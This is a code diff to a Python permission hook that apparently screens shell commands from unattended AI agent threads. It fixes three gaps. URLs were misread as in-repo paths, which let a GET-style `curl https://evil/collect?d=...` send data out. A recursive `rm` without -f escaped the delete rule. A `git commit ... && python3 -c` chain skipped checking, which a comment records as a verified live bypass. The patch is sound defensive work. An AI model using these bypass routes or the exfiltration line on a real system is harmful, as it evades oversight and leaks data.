@@ -71,6 +71,9 @@ def _xargs_utility(rest: list[str]) -> str:
 CODE_OPTS = frozenset({"-c", "--command", "-e", "--eval"})
 CODE_VERBS = frozenset({"eval", "exec", "source", "."})
 MAX_WRAP_DEPTH = 3
+# Tokens shlex preserves that end one command and begin another. Used to scope
+# the inert-text exemptions in _wrapped_verdict to a single command.
+SHELL_OPERATORS = frozenset({"&&", "||", ";", "|", "&", ";;"})
 WS_IN_TOKEN = re.compile(r"\s")
 # Deny-class content inside a single quoted argument. A multi-word token is
 # NOT a path and never reaches _path_ok, so `sh -c "..."`, `eval "..."` and
@@ -96,9 +99,30 @@ def _tokens(command: str) -> list[str]:
         return command.split()
 
 
+URL_RE = re.compile(r"^[a-zA-Z][a-zA-Z0-9+.-]*://(?P<host>[^/?#]*)")
+LOOPBACK_HOSTS = ("127.0.0.1", "localhost", "[::1]", "::1")
+
+
+def _loopback_url(tok: str) -> bool | None:
+    """None if tok is not a URL; else True when its host is loopback.
+
+    A URL contains "/" so _is_path_candidate used to call it a relative path,
+    _resolve joined it under ROOT, and `curl https://evil/collect?d=...` came
+    back "in-repo, no deny match" - a GET-shaped egress the curl DENY rule
+    (POST/PUT/-d/-F only) never sees.
+    """
+    m = URL_RE.match(tok)
+    if not m:
+        return None
+    host = m.group("host").split("@")[-1].split(":")[0] or ""
+    return host in LOOPBACK_HOSTS or host == "[::1]"
+
+
 def _is_path_candidate(tok: str) -> bool:
     if tok == "/":
         return False  # a bare slash is division/a separator in wrapped code, not a path
+    if _loopback_url(tok) is not None:
+        return False  # a URL is not a path; egress is judged by _url_verdict
     return bool(PATH_TOKEN.match(tok)) or "/" in tok or ".." in tok
 
 
@@ -227,9 +251,14 @@ def _delete_denied(command: str, root: Path) -> str | None:
         if verb == "rm":
             has_recursive, has_force, args = _rm_flags_and_args(rest)
             # A non-recursive rm of one in-repo file is routine work
-            # (`rm -f state/gui-token`); only recursive+force is destructive.
-            if has_recursive and has_force and not _all_args_in_state(args, root):
-                return "rm -rf outside state/ and /tmp"
+            # (`rm -f state/gui-token`). RECURSION is what makes it destructive -
+            # `rm -r games/pinball` erases the frozen instrument just as
+            # thoroughly as `rm -rf` does, and an unattended thread never sees
+            # the write-protect prompt that -f suppresses, so -f is not the
+            # thing that distinguishes them.
+            if has_recursive and not _all_args_in_state(args, root):
+                return "recursive rm outside state/ and /tmp"
+            _ = has_force
         elif verb in ("rmdir", "unlink"):
             if not _all_args_in_state(_plain_args(rest), root):
                 return f"{verb} outside state/ and /tmp"
@@ -279,14 +308,33 @@ def _wrapped_verdict(command: str, root: Path, depth: int) -> tuple[str, str] | 
        outright.
     """
     tokens = _tokens(command)
-    # `fleet send` bodies are inert text delivered to another thread's prompt; the
-    # receiving thread's own hooks judge whatever it eventually runs. Scanning the
-    # quoted packet text here only produces false positives ('curl' in a done line).
+    # `fleet send` bodies and `git commit` messages are inert text: a packet is
+    # judged by the receiving thread's own hooks, and a commit message never
+    # executes. Scanning them here only produced false positives ('curl' in a
+    # done line, a deny-word in a commit subject).
+    #
+    # The exemption is scoped to the current command only, NOT the whole line.
+    # Returning early for everything let
+    #   git commit -m "x" && python3 -c "<payload>"
+    # skip wrapped-code analysis entirely - verified as a live bypass.
+    #
+    # Tokenisation stays whole-command and quote-aware on purpose: splitting the
+    # raw text on shell operators cuts through the inside of a quoted payload
+    # (`python3 -c "import shutil; shutil.rmtree(...)"` splits at the `;`),
+    # shredding the very token that needs judging.
+    inert = False
     for i, tok in enumerate(tokens):
+        if tok in SHELL_OPERATORS:
+            inert = False  # a new command starts here; resume judging
+            continue
         if tok == "send" and i and tokens[i - 1].endswith("fleet"):
-            return None
+            inert = True
+            continue
         if tok == "commit" and i and tokens[i - 1] == "git":
-            return None  # commit messages are inert text; chained commands still hit DENY
+            inert = True
+            continue
+        if inert:
+            continue
         prev = tokens[i - 1] if i else ""
         is_code = prev in CODE_OPTS or prev in CODE_VERBS
         # A code payload is judged whatever its shape: a space-free one-liner
@@ -316,6 +364,10 @@ def decide_auto(command: str, root: Path, _depth: int = 0) -> tuple[str, str]:
     wrapped = _wrapped_verdict(command, root, _depth)
     if wrapped:
         return wrapped
+    for tok in _tokens(command):
+        lb = _loopback_url(tok)
+        if lb is False:
+            return "escalate", f"non-loopback URL: {tok}"
     for tok in _tokens(command):
         if not _path_ok(tok, root):
             return "escalate", f"path outside repo: {tok}"
